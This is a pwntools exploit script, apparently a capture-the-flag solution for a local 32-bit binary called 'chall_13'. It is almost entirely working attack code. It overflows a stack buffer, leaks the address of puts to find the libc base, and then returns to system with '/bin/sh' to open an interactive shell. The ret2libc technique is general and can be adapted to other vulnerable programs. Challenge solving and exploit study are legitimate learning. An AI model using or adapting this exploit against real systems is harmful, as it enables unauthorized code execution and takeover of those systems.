from pwn import *
# Load the binary
binary = context.binary = ELF('./chall_13')

# Start the process
p = process(binary.path)

p.recv()

payload = b'A' * (0x10c + 0x4) #rule of ryan
payload += p32(binary.plt.puts)
payload += p32(binary.sym.vuln)
payload += p32(binary.got.puts)

p.sendline(payload)

_ = p.recv(4)
puts = u32(_)
log.info('puts: ' + hex(puts))

p.recv()

libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = b'A' * (0x10c + 0x4)
payload += p32(libc.sym.system)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())

p.sendline(payload)
p.interactive()
